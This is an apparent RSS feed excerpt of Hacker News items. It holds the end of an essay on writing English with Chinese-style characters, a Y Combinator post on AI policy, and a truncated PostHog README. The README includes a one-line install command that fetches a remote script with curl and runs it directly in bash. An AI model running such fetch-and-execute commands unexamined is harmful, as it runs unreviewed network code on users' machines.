</p><p>Note that there are no main entries for what we're used to calling <b>words</b> at all.  There wouldn't be a main entry at all for a word like <i>person</i>, for instance.  There would be an entry for the <i>man</i> radical; under it a sub-entry for the <per-> character<i> per</i>, and <i>person</i> would be listed as a sub-sub-entry under that.

</per-></p><h3>Thinking in yingzi </h3>

<p>The nature of the writing system would encourage lexicographers (and English speakers) to think of everything in the language as <b>built out of yingzi</b>.  There wouldn't seem to be a great difference between "words" like <i>storehouse</i>, <i>storage, restore </i>and "expressions" like <i>shoe store, store up, store detective, store manager</i>; or between <i>blackboard</i> and <i>black eye</i>, or between <i>alphabet</i> and <i>alpha male</i>.

</p><p>Many morphemes that now live out a shadowy existence, forever bound to other morphemes, would take on an <b>independent existence</b>; for instance the <i>volve</i> in <i>revolve, evolve, involve, devolve</i>, which would have its own yingzi, and would seem as much a "word" or component of the language as the <i>match</i> in <i>rematch, mismatch, unmatch</i>.  There would be a tendency to describe the meanings, vague or miscellaneous as they might be, for such characters.

</p><p>This might seem sensible and even wise for a morpheme like <i>volve</i>, which after all derives from a real Latin root meaning <i>roll</i>; but there would be other, more <b>dubious applications</b>.  For instance, the <i>son</i> in <i>person </i>was represented by <img src="https://zompist.com/yingzi/son.gif">, which happens to be the yingzi for <i>son.</i>  It will be almost impossible not to assume that <i>person</i> derives from <i>son</i>; but historically it's just a coincidence; <i>person </i>derives from Latin and has nothing to do with <i>son</i>.

</p><p>Worse yet, the -<i>cuit</i> of <i>biscuit</i> and <i>circuit</i> might be written with the same character (a derivative of <i>kit</i>), and a meaning sought for it-- perhaps 'round', since biscuits are round and circuits involve going round.  Again, etymologically this is nonsense.

</p><p>Words, perceived as compounds, might lend themselves to <b>abbreviation</b>.  After all, why write two yingzi when one will do, especially if it unmistakably implies its partner?  For instance, <i>language</i> would be a two-character word <img src="https://zompist.com/yingzi/lang.gif"><img src="https://zompist.com/yingzi/gwidge.gif">, each character defined only as part of this compound and used nowhere else in the language.  If you've written <lang> <i>lang</i>, you must write <gwidge> <i>gwidge</i> next.  You might as well just write <img src="https://zompist.com/yingzi/lang.gif"> <i>lang</i> and leave it at that.  Ultimately of course <img src="https://zompist.com/yingzi/lang.gif"> will acquire a meaning of its own-- namely <i>language.  </i>And for consistency's sake lexicographers might well give <i>gwidge</i> a meaning of its own as well--namely, <i>language</i>.

</gwidge></lang></p><p>The complexities of the writing system, the inherent interest of the pictorial elements, the cleverness inherent in graphic compounds like <woods><i> woods</i> and the radical-phonetic system, and even sociological facts such as the time it takes to learn the system, and the fact that English speakers of all nations can use it whatever their native dialect, would also combine to give the writing system an <b>overwhelming character</b> of its own.  It would be seen as more important than speech; there would even be a tendency to think of <b>words as derived from characters</b> rather than the other way around.  

</woods></p><p>If someone asks where a word comes from, we (now) think of its original phonetic form; we say for instance that <i>language</i> comes from French<i> langage</i>, itself derived from Latin <i>lingua</i> 'tongue', which in turn comes from Proto-Indo-European <i>dnghu</i>.  With the yingzi system, people would be tempted instead to give what we might call the <b>graphic etymology</b>.  They'd say that <i>lang</i> derives from the <i>speech</i> radical and the <i>gang </i>phonetic, and that the latter is actually a picture of a gang-- a reduplication of the <i>man</i> character.  That is indeed where <img src="https://zompist.com/yingzi/lang.gif"> comes from, but not <i>lang</i>, which did not derive from it!  (But it wouldn't even be easy to make this point in yingzi-- how do you distinguish <i>lang</i> from <img src="https://zompist.com/yingzi/lang.gif"> if you can't even write "lang" without writing the character?)

</p><h3>A word is a word is a word</h3>

<p>Does all this mean that <b>words are cultural constructs</b> or that the concept of a word would no longer apply to English written in yingzi?  Not at all.  A <b>word</b> is still a useful linguistic concept-- or rather a series of overlapping concepts.  By <i>word</i> linguists may mean one or all of the following:

</p><ul>
<li>a phonological unit-- e.g. something with one stress accent or one pitch contour; or a unit within which intervocalic stops get voiced. 
</li><li>the abstraction underlying a set of morphological forms (e.g. <i>write</i> underlying <i>write, writes, writing, written, wrote</i>).
</li><li>an element which can stand alone (e.g. in response to a suitably chosen question), as suffixes or bound morphemes cannot.
</li><li>a morphological unit you can't insert other morphemes into (e.g. <i>black dog</i> is not a word since you can change it to <i>black, tired dog</i>; but you can't turn <i>blackbird</i> into <i>blacktiredbird</i>) 
</li><li>an expression with a conventional meaning-- something that has to be defined in the mental lexicon (this sense is also called a <b>lexeme</b>).
</li></ul>

<p>A moment's thought should show that these definitions <b>may or may not coincide</b> even in English; and that even where they do they may not coincide with the <b>typographical</b> or lexicographical notion of a word.  The latter idea-- roughly 'something with spaces around it'-- is of little interest to linguists since it depends on the writing system.  That makes it useless for describing most of the languages of the world; and even for written languages it's pretty arbitrary, as this page should show.  (Everything you know about writing English would change if we adopted yingzi instead.) 

</p><p>It's safe to say, however, that such definitions would seem fairly abstract in a yingzi system.  <i>Word</i> might become a technical term, like <i>morpheme</i> or <i>lexeme</i>.  Or it might be identified with a yingzi (a written character); or be abstracted into a more vaguely defined linguistic element, applicable to anything from a character to a compound to a whole phrase. 

</p><hr>
<h3>Hey, did I just learn something about Chinese?</h3>

<p>I've attempted in this sketch to lay out, by analogy, the nature and structure of the Chinese writing system.  All of the concepts apply: 

</p><ul>
<li>the limited role of pictograms
</li><li>the clever compound pictures (indeed all three examples are from Chinese)
</li><li>the phonetic-and-radical system (97% of Chinese characters work this way) 
</li><li>the inclusion of radicals as part of the character (rather than as separate symbols, as in cuneiform or hieroglyphic writing) 
</li><li>the relative information content of radicals and phonetics
</li><li>compounds used as secondary phonetics
</li><li>the handling of multisyllabic and foreign words
</li><li>the handling of subsyllabic morphemes (the model here is Mandarin <i>-r</i>, represented by <i>ér</i>)
</li><li>the organization of dictionaries (in fact, the graphic at the top of the page shows part of the radical index for a Chinese dictionary, organized by stroke count)  
</li><li>the psychological effects.  
</li></ul>

<p>The <b>radicals</b> named are all also Chinese radicals.  The <b>phonetics</b> are not, of course, since the phonetics in hanzi refer to the sounds of Chinese words, not English ones.  But I tried to pick phonetics which would also be phonetics in Chinese (e.g. <i>sun, king, wing, tree, one, east, field, bill</i>).

</p><p>There are differences, too.  For instance, I haven't made any attempt to make my yingzi look like hanzi.  

</p><p>The phonetic sets of Chinese are not exactly based on rhymes.  Karlgren explains that the hanzi belonging to one set had homorganic initial consonants (e.g. k, g), the same main vowel, and the same final consonant.  

</p><p>I've also <b>underreported the complexity</b> (and arguably the inefficiency) of the Chinese script in several important ways:

</p><ul>
<li>The phonetic sets in Chinese, though still useful, are two thousand years out of date.  It's as if my yingzi phonetics had to rhyme in Proto-Germanic, not in modern English.  
</li><li>The scribes who devised hanzi often went wild adding radicals, creating multiple characters for what are etymologically the same root.  
</li><li>Four milennia have reduced the pictorial content of the hanzi primitives almost to nil.  What the "pictograms" are pictures of is often evident only to the scholar.  
</li><li>Clear and precise handwriting is by no means a virtue in Chinese; the most admired style, <i>câoshu</i>, is highly simplified, suggesting rather than delineating the characters intended.
</li><li>The People's Republic has simplified many of the traditional hanzi; and this reform has been accepted in Singapore but not in Taiwan or Hong Kong.  It's as if the US had its own versions of a large fraction of English yingzi.
</li></ul>

<p>I also haven't gotten into the many additional complications engendered when hanzi were adopted by Japanese, Korean, or Vietnamese; for more on that see 
John DeFrancis's <i>The Chinese Language: Fact and Fantasy.</i>

</p><p>In some respects, however, yingzi are <b>harder</b> than hanzi.  For instance, English has many more multisyllabic morphemes than Chinese.  Only about 10% of Chinese morphemes are more than one syllable long.  Also, English has borrowed so much that it often has five or six morphemes where Chinese would have just one-- compare <i>wáng</i> vs. <i>king, regal, royal, regicide, Rex</i>, or <i>zì</i> vs. <i>word, verb, logograph, bon mot.</i>


</p><p><i>--Mark Rosenfelder</i>

</p><hr>

<a href="http://www.zompist.com/default.html">[ Home ]</a>

<ul>
<li>Check out this <a href="http://zhongwen.com/">marvelously interactive Chinese dictionary</a>, a great way to explore how hanzi work.
</li></ul>

<hr>

<a name="answers"><img src="https://zompist.com/yingzi/fell.gif"><img src="https://zompist.com/yingzi/bean.gif"><img src="https://zompist.com/yingzi/knee.gif"></a> <b><i><a href="#fellini">Fellini:</a></i></b> <i>fell</i> has the radical <i>vertical</i> and the phonetic <i>sell</i>; <i>lean</i> has the radical <i>stand</i> and the phonetic <i>bean</i>; and <i>knee</i> has the radical <i>body</i> and phonetic <i>tree.</i>



</div>]]></description>
        </item>
        <item>
            <title><![CDATA[Why YC went to DC (233 pts)]]></title>
            <link>https://www.ycombinator.com/blog/why-yc-went-to-dc/</link>
            <guid>40564639</guid>
            <pubDate>Mon, 03 Jun 2024 17:00:33 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.ycombinator.com/blog/why-yc-went-to-dc/">https://www.ycombinator.com/blog/why-yc-went-to-dc/</a>, See on <a href="https://news.ycombinator.com/item?id=40564639">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>For most of this century, Big Tech has been allowed to operate with little scrutiny or oversight — to disastrous effects, in the form of social media harms, anti competitive practices, and more. Despite recent efforts to rein them in, a small handful of mega companies continue to wield enormous power in our economy and in Washington — and now, Washington is at risk of repeating the mistakes of the past when it comes to artificial intelligence. </p><p>A few weeks ago, I went to DC to start engaging policymakers and be the voice of <a href="https://x.com/garrytan/status/1595232588255309824?s=46&amp;t=t0fy922SkI6eb4WhJHKTSQ">little tech</a> — the emerging tech keeping our economy dynamic. We met with leaders from both parties and White House officials who oversee tech policy, and spoke to them about the importance of open source AI, talent access through immigration, market access through antitrust action, and the elimination of noncompetes.</p><p>While we should listen to what the biggest names from the biggest companies have to say on AI and other areas of tech, we also need to also make room for the thousands of startups that can help ensure the benefits of AI are shared widely and that American leadership in the technology space continues. The founders of these companies have important perspectives on critical issues like open source versus closed source development, national security concerns, threats to innovation, and more.</p><p>I see their value firsthand. The YC community is now made up of 11,000 founders and 5,000 startups from nearly every state in the US. This year, we’ll fund more than 500 companies out of 50,000 applications, and almost all of them are related to AI in some way. We’re determined to help grow the next generation of great companies, as these innovators are critical to pushing the boundaries of what's possible and ensuring the benefits of AI are widely distributed.</p><p>There are many reasons to be optimistic about AI and its ability to improve our lives – from helping us find new ways to tackle climate change to <a href="https://www.commonwealthfund.org/publications/issue-briefs/2023/oct/high-us-health-care-spending-where-is-it-all-going">cutting costs</a> in healthcare. Unlocking those benefits will require acknowledging that there are big ideas at little companies that need to be given the space to take off. We need smart policy to ensure that happens — and they need to be at the table to be heard. </p><p>This is a once-in-a-generation moment, and ignoring the perspective and interests of startups by writing policy that kills them before they ever have a chance to get off the ground would be one of the most damning mistakes lawmakers can make. </p><p>That’s why we need AI policy that promotes fair, open, and competitive markets. In other words, we need policies that can help little tech thrive. Here’s what we shared with senior government officials: </p><ul><li>First, let’s prioritize open source models and more tailored AI applications to shape the competitive landscape and create real opportunities for startups. Open source AI models allow for greater transparency, collaboration, and innovation by making the underlying code publicly accessible and modifiable. In contrast, closed source models, often favored by large tech companies, can limit competition and concentrate power. But how open should we be? <p>While there are certainly safety concerns about open source technology getting into the hands of bad actors, those concerns have so far proven to be overblown. It would be far more dangerous for lawmakers to cave to Big Tech <a href="https://time.com/6972134/ai-lobbying-tech-policy-surge/">lobbying</a> and craft policy that closes off AI development. Doing so would put more power in fewer hands, and stunt innovation by clipping the wings on a dazzling array of world-changing startups before they have a chance to compete.</p></li><li>Second, we need to <a href="https://www.ycombinator.com/blog/content/files/2024/06/RemedyFest-Final-Report.pdf">prioritize forceful remedies to foster competition</a> in the market and ensure new entrants can make inroads without fear of retaliation. We need decisive action to compel more interoperability by the largest firms and curb self-preferencing so we restore competition and innovation, similar to measures called for in the American Innovation and Choice Online Act that Big Tech lobbying <a href="https://www.bloomberg.com/news/articles/2022-12-20/big-tech-divided-and-conquered-to-block-key-bipartisan-bills">killed</a> at the eleventh hour in 2021. At the end of the day, we need an open and neutral app ecosystem where consumers and developers can maintain a direct relationship. <br></li><li>And finally, we need more steps like the FTC’s recent move to ban all employee noncompetes (no carve outs, no limitations, no exceptions). That kind of common sense policy helps founders build strong, new companies and disrupt the status quo.</li></ul><p>This country is built on the idea of rugged individualism, ingenuity, and grit. It’s also built on the idea of equal opportunity. As we approach a new age of innovation, where the rules of the road are being written as we speak, we need to give little tech a chance to succeed. All of us will benefit as a result.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Posthog – open-source analytics and UX research tool (118 pts)]]></title>
            <link>https://github.com/PostHog/posthog</link>
            <guid>40564345</guid>
            <pubDate>Mon, 03 Jun 2024 16:32:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/PostHog/posthog">https://github.com/PostHog/posthog</a>, See on <a href="https://news.ycombinator.com/item?id=40564345">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto">
  <a target="_blank" rel="noopener noreferrer nofollow" href="https://user-images.githubusercontent.com/65415371/205059737-c8a4f836-4889-4654-902e-f302b187b6a0.png"><img alt="posthoglogo" src="https://user-images.githubusercontent.com/65415371/205059737-c8a4f836-4889-4654-902e-f302b187b6a0.png"></a>
</p>
<p dir="auto">
  
<a href="https://posthog.com/contributors" rel="nofollow"><img src="https://camo.githubusercontent.com/54ea3f197e24240af3f6ab758e7c91abf58ba6fa83aa585438ac06d60df4583b/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f616c6c5f636f6e7472696275746f72732d3235312d6f72616e67652e7376673f7374796c653d666c61742d737175617265" data-canonical-src="https://img.shields.io/badge/all_contributors-251-orange.svg?style=flat-square"></a>

  <a href="http://makeapullrequest.com/" rel="nofollow"><img alt="PRs Welcome" src="https://camo.githubusercontent.com/1a97d303fbf3624999e2c69a6fa0699ef0c1d3b6e9bea256b39ea006289fcd59/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f5052732d77656c636f6d652d627269676874677265656e2e7376673f7374796c653d736869656c6473" data-canonical-src="https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=shields"></a>
  <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/4ddb1305f6c5069a28bd434d0c662ace59c1b74ba4f8f80317ca3d0f8be33103/68747470733a2f2f696d672e736869656c64732e696f2f646f636b65722f70756c6c732f706f7374686f672f706f7374686f67"><img alt="Docker Pulls" src="https://camo.githubusercontent.com/4ddb1305f6c5069a28bd434d0c662ace59c1b74ba4f8f80317ca3d0f8be33103/68747470733a2f2f696d672e736869656c64732e696f2f646f636b65722f70756c6c732f706f7374686f672f706f7374686f67" data-canonical-src="https://img.shields.io/docker/pulls/posthog/posthog"></a>
  <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/31850c6be40aa702518565df5f342a41218cbeb4af0ffa93a13a6c9b70974ed8/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f636f6d6d69742d61637469766974792f6d2f706f7374686f672f706f7374686f67"><img alt="GitHub commit activity" src="https://camo.githubusercontent.com/31850c6be40aa702518565df5f342a41218cbeb4af0ffa93a13a6c9b70974ed8/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f636f6d6d69742d61637469766974792f6d2f706f7374686f672f706f7374686f67" data-canonical-src="https://img.shields.io/github/commit-activity/m/posthog/posthog"></a>
  <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/237b01d44d213cb8c9b30eed88f935bc9f771942c8135ba8523a99581cf999c1/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f6973737565732d636c6f7365642f706f7374686f672f706f7374686f67"><img alt="GitHub closed issues" src="https://camo.githubusercontent.com/237b01d44d213cb8c9b30eed88f935bc9f771942c8135ba8523a99581cf999c1/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f6973737565732d636c6f7365642f706f7374686f672f706f7374686f67" data-canonical-src="https://img.shields.io/github/issues-closed/posthog/posthog"></a>
</p>
<p dir="auto">
  <a href="https://posthog.com/docs" rel="nofollow">Docs</a> - <a href="https://posthog.com/community" rel="nofollow">Community</a> - <a href="https://posthog.com/roadmap" rel="nofollow">Roadmap</a> - <a href="https://posthog.com/changelog" rel="nofollow">Changelog</a> - <a href="https://github.com/PostHog/posthog/issues/new?assignees=&amp;labels=bug&amp;template=bug_report.md">Bug reports</a> 
</p>
<p dir="auto">
  <a href="https://www.youtube.com/watch?v=2jQco8hEvTI" rel="nofollow">
    <img src="https://camo.githubusercontent.com/05a7046cb05054e50ff1c4941dff00d7b0c20452856a14ecadea32d07d337da0/68747470733a2f2f696d672e796f75747562652e636f6d2f76692f326a51636f3868457654492f302e6a7067" alt="PostHog Demonstration" data-canonical-src="https://img.youtube.com/vi/2jQco8hEvTI/0.jpg">
  </a>
  <em>See PostHog in action</em>
</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">PostHog is an all-in-one, open source platform for building better products</h2><a id="user-content-posthog-is-an-all-in-one-open-source-platform-for-building-better-products" aria-label="Permalink: PostHog is an all-in-one, open source platform for building better products" href="#posthog-is-an-all-in-one-open-source-platform-for-building-better-products"></a></p>
<ul dir="auto">
<li>Specify events manually, or use autocapture to get started quickly</li>
<li>Analyze data with ready-made visualizations, or do it yourself with SQL</li>
<li>Gather insights by capturing session replays, console logs, and network monitoring</li>
<li>Improve your product with A/B testing that automatically analyzes performance</li>
<li>Safely roll out features to select users or cohorts with feature flags</li>
<li>Send out fully customizable surveys to specific cohorts of users</li>
<li>Connect to external services and manage data flows with PostHog CDP</li>
</ul>
<p dir="auto">PostHog is available with hosting in the EU or US and is fully SOC 2 compliant. It's free to get started and comes with a generous monthly free tier:</p>
<ul dir="auto">
<li>1 million product analytics events</li>
<li>5k session replays</li>
<li>1 million feature flag requests</li>
<li>250 survey responses</li>
</ul>
<p dir="auto">We're constantly adding new features, with web analytics and data warehouse now in beta!</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Table of Contents</h2><a id="user-content-table-of-contents" aria-label="Permalink: Table of Contents" href="#table-of-contents"></a></p>
<ul dir="auto">
<li><a href="#get-started-for-free">Get started for free</a></li>
<li><a href="#docs">Docs</a></li>
<li><a href="#contributing">Contributing</a></li>
<li><a href="#philosophy">Philosophy</a></li>
<li><a href="#open-source-vs-paid">Open-source vs paid</a></li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Get started for free</h2><a id="user-content-get-started-for-free" aria-label="Permalink: Get started for free" href="#get-started-for-free"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">PostHog Cloud (Recommended)</h3><a id="user-content-posthog-cloud-recommended" aria-label="Permalink: PostHog Cloud (Recommended)" href="#posthog-cloud-recommended"></a></p>
<p dir="auto">The fastest and most reliable way to get started with PostHog is signing up for free to&nbsp;<a href="https://us.posthog.com/signup" rel="nofollow">PostHog Cloud</a> or <a href="https://eu.posthog.com/signup" rel="nofollow">PostHog Cloud EU</a>. Your first 1 million events (and 5k replays) are free every month, after which you pay based on usage.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Open-source hobby deploy (Advanced)</h3><a id="user-content-open-source-hobby-deploy-advanced" aria-label="Permalink: Open-source hobby deploy (Advanced)" href="#open-source-hobby-deploy-advanced"></a></p>
<p dir="auto">You can deploy a hobby instance in one line on Linux with Docker (recommended 4GB memory):</p>
<div dir="auto" data-snippet-clipboard-copy-content=" /bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/posthog/posthog/HEAD/bin/deploy-hobby)&quot; "><pre> /bin/bash -c <span><span>"</span><span><span>$(</span>curl -fsSL https://raw.githubusercontent.com/posthog/posthog/HEAD/bin/deploy-hobby<span>)</span></span><span>"</span></span> </pre></div>
<p dir="auto">Open source deployments should scale to approximately 100k events per month, after which we recommend migrating to a PostHog Cloud instance. See our <a href="https://posthog.com/docs/self-host/open-source/deployment" rel="nofollow">docs for more info and limitations</a>. Please note that we do not provide customer support for open source deployments.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Docs</h2><a id="user-content-docs" aria-label="Permalink: Docs" href="#docs"></a></p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://user-images.githubusercontent.com/85295485/144591577-fe97e4a5-5631-4a60-a684-45caf421507f.gif"><img src="https://user-images.githubusercontent.com/85295485/144591577-fe97e4a5-5631-4a60-a684-45caf421507f.gif" alt="ui-demo" data-animated-image=""></a></p>
<p dir="auto">Want to find out more? <a href="https://posthog.com/book-a-demo" rel="nofollow">Request a demo!</a>
</p><p dir="auto">PostHog brings all the tools and data you need to build better products.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Analytics and optimization tools</h3><a id="user-content-analytics-and-optimization-tools" aria-label="Permalink: Analytics and optimization tools" href="#analytics-and-optimization-tools"></a></p>
<ul dir="auto">
<li><strong>Event-based analytics:</strong> Capture your product's usage <a href="https://posthog.com/docs/libraries/js#autocapture" rel="nofollow">automatically</a>, or <a href="https://posthog.com/docs/getting-started/install" rel="nofollow">customize</a> it to your needs</li>
<li><strong>User and group tracking:</strong> Understand the <a href="https://posthog.com/manual/persons" rel="nofollow">people</a> and <a href="https://posthog.com/manual/group-analytics" rel="nofollow">groups</a> behind the events and track properties about them</li>
<li><strong>Data visualizations:</strong> Create and share <a href="https://posthog.com/docs/features/trends" rel="nofollow">graphs</a>, <a href="https://posthog.com/docs/features/funnels" rel="nofollow">funnels</a>, <a href="https://posthog.com/docs/features/paths" rel="nofollow">paths</a>, <a href="https://posthog.com/docs/features/retention" rel="nofollow">retention</a>, and <a href="https://posthog.com/docs/features/dashboards" rel="nofollow">dashboards</a></li>
<li><strong>SQL access:</strong> Use <a href="https://posthog.com/docs/product-analytics/sql" rel="nofollow">SQL</a> to get a deeper understanding of your users, breakdown information and create completely tailored visualizations</li>
<li><strong>Session replays:</strong> <a href="https://posthog.com/docs/features/session-recording" rel="nofollow">Watch videos</a> of your users' behavior, with fine-grained filters and privacy controls, as well as network monitoring and captured console logs</li>
<li><strong>Heatmaps:</strong> See where users click and get a visual representation of their behaviour with the <a href="https://posthog.com/docs/features/toolbar" rel="nofollow">PostHog Toolbar</a></li>
<li><strong>Feature flags:</strong> Test and manage the rollout of <a href="https://posthog.com/docs/feature-flags/installation" rel="nofollow">new features</a> to specific users and groups, or deploy flags as kill-switches</li>
<li><strong>A/B and multivariate experimentation:</strong> run simple or complex changes as <a href="https://posthog.com/manual/experimentation" rel="nofollow">experiments</a> and get automatic significance calculations</li>
<li><strong>Correlation analysis:</strong> Discover what events and properties <a href="https://posthog.com/manual/correlation" rel="nofollow">correlate</a> with success and failure</li>
<li><strong>Surveys:</strong> Collect qualitative feedback from your users using fully customizable <a href="https://posthog.com/docs/surveys/installation" rel="nofollow">surveys</a></li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Data and infrastructure tools</h3><a id="user-content-data-and-infrastructure-tools" aria-label="Permalink: Data and infrastructure tools" href="#data-and-infrastructure-tools"></a></p>
<ul dir="auto">
<li><strong>Import and export your data:</strong> Import from and export to the services that matter to you with <a href="https://posthog.com/docs/cdp" rel="nofollow">the PostHog CDP</a></li>
<li><strong>Ready-made libraries:</strong> We’ve built libraries for <a href="https://posthog.com/docs/libraries/js" rel="nofollow">JavaScript</a>, <a href="https://posthog.com/docs/libraries/python" rel="nofollow">Python</a>, <a href="https://posthog.com/docs/libraries/ruby" rel="nofollow">Ruby</a>, <a href="https://posthog.com/docs/libraries/node" rel="nofollow">Node</a>, <a href="https://posthog.com/docs/libraries/go" rel="nofollow">Go</a>, <a href="https://posthog.com/docs/libraries/android" rel="nofollow">Android</a>, <a href="https://posthog.com/docs/libraries/ios" rel="nofollow">iOS</a>, <a href="https://posthog.com/docs/libraries/php" rel="nofollow">PHP</a>, <a href="https://posthog.com/docs/libraries/flutter" rel="nofollow">Flutter</a>, <a href="https://posthog.com/docs/libraries/react-native" rel="nofollow">React Native</a>, <a href="https://posthog.com/docs/libraries/elixir" rel="nofollow">Elixir</a>, <a href="https://github.com/Yardanico/posthog-nim">Nim</a>, and an <a href="https://posthog.com/docs/api" rel="nofollow">API</a> for anything else</li>
<li><strong>Plays nicely with data warehouses:</strong> import events or user data from your warehouse by writing a simple transformation plugin, and export data with pre-built apps - such as <a href="https://posthog.com/apps/bigquery-export" rel="nofollow">BigQuery</a>, <a href="https://posthog.com/apps/redshift-export" rel="nofollow">Redshift</a>, <a href="https://posthog.com/apps/snowflake-export" rel="nofollow">Snowflake</a>, and <a href="https://posthog.com/apps/s3-expo" rel="nofollow">S3</a></li>
</ul>
<p dir="auto"><a href="https://posthog.com/product" rel="nofollow">Read a full list of PostHog features</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Contributing</h2><a id="user-content-contributing" aria-label="Permalink: Contributing" href="#contributing"></a></p>
<p dir="auto">We &lt;3 contributions big and small. In priority order (although everything is appreciated) with the most helpful first:</p>
<ul dir="auto">
<li>Vote on features or get early access to beta functionality in our <a href="https://posthog.com/roadmap" rel="nofollow">roadmap</a></li>
<li>Open a PR (see our instructions on <a href="https://posthog.com/handbook/engineering/developing-locally" rel="nofollow">developing PostHog locally</a>)</li>
<li>Submit a <a href="https://github.com/PostHog/posthog/issues/new?assignees=&amp;labels=enhancement%2C+feature&amp;template=feature_request.md">feature request</a> or <a href="https://github.com/PostHog/posthog/issues/new?assignees=&amp;labels=bug&amp;template=bug_report.md">bug report</a></li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Philosophy</h2><a id="user-content-philosophy" aria-label="Permalink: Philosophy" href="#philosophy"></a></p>
<p dir="auto">Our mission is to&nbsp;increase the number of successful products&nbsp;in the world. To do that, we build product and data tools that help you understand user behavior without losing control of your data.</p>
<p dir="auto">In our view, third-party analytics tools do not work in a world of cookie deprecation, GDPR, HIPAA, CCPA, and many other four-letter acronyms. PostHog is the alternative to sending all of your customers' personal information and usage data to third-parties.</p>
<p dir="auto">PostHog gives you every tool you need to understand user behavior, develop and test improvements, and release changes to make your product more successful.</p>
<p dir="auto">PostHog operates in public as much as possible. We detail how we work and our learning on building and running a fast-growing, product-focused startup in our <a href="https://posthog.com/handbook/getting-started/start-here" rel="nofollow">handbook</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Open-source vs. paid</h2><a id="user-content-open-source-vs-paid" aria-label="Permalink: Open-source vs. paid" href="#open-source-vs-paid"></a></p>
<p dir="auto">This repo is available under the <a href="https://github.com/PostHog/posthog/blob/master/LICENSE">MIT expat license</a>, except for the <code>ee</code> directory (which has it's <a href="https://github.com/PostHog/posthog/blob/master/ee/LICENSE">license here</a>) if applicable.</p>
<p dir="auto">Need <em>absolutely 💯% FOSS</em>? Check out our <a href="https://github.com/PostHog/posthog-foss">posthog-foss</a> repository, which is purged of all proprietary code and features.</p>
<p dir="auto">To learn more, <a href="https://posthog.com/book-a-demo" rel="nofollow">book a demo</a> or see our <a href="https://posthog.com/pricing" rel="nofollow">pricing page</a>.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">We’re hiring!</h3><a id="user-content-were-hiring" aria-label="Permalink: We’re hiring!" href="#were-hiring"></a></p>
<p dir="auto">Come help us make PostHog even better. We're growing fast <a href="https://posthog.com/careers" rel="nofollow">and would love for you to join us</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Contributors 🦸</h2><a id="user-content-contributors-" aria-label="Permalink: Contributors 🦸" href="#contributors-"></a></p>



<p dir="auto"><a href="https://github.com/timgl"><img src="https://avatars.githubusercontent.com/u/1727427?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/mariusandra"><img src="https://avatars.githubusercontent.com/u/53387?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/EDsCODE"><img src="https://avatars.githubusercontent.com/u/13127476?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/Twixes"><img src="https://avatars.githubusercontent.com/u/4550621?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/macobo"><img src="https://avatars.githubusercontent.com/u/148820?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/paolodamico"><img src="https://avatars.githubusercontent.com/u/5864173?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/fuziontech"><img src="https://avatars.githubusercontent.com/u/391319?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/yakkomajuri"><img src="https://avatars.githubusercontent.com/u/38760734?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/jamesefhawkins"><img src="https://avatars.githubusercontent.com/u/47497682?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/posthog-bot"><img src="https://avatars.githubusercontent.com/u/69588470?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/apps/dependabot-preview"><img src="https://avatars.githubusercontent.com/in/2141?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/bhavish-agarwal"><img src="https://avatars.githubusercontent.com/u/14195048?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/Tannergoods"><img src="https://avatars.githubusercontent.com/u/60791437?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/ungless"><img src="https://avatars.githubusercontent.com/u/8397061?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/apps/dependabot"><img src="https://avatars.githubusercontent.com/in/29110?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/gzog"><img src="https://avatars.githubusercontent.com/u/1487006?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/samcaspus"><img src="https://avatars.githubusercontent.com/u/19220113?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/Tmunayyer"><img src="https://avatars.githubusercontent.com/u/29887304?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/adamb70"><img src="https://avatars.githubusercontent.com/u/11885987?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/SanketDG"><img src="https://avatars.githubusercontent.com/u/8980971?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/kpthatsme"><img src="https://avatars.githubusercontent.com/u/5965891?v=4" width="50" height="50" alt=""></a> <a href="https://github.com/J0"><img 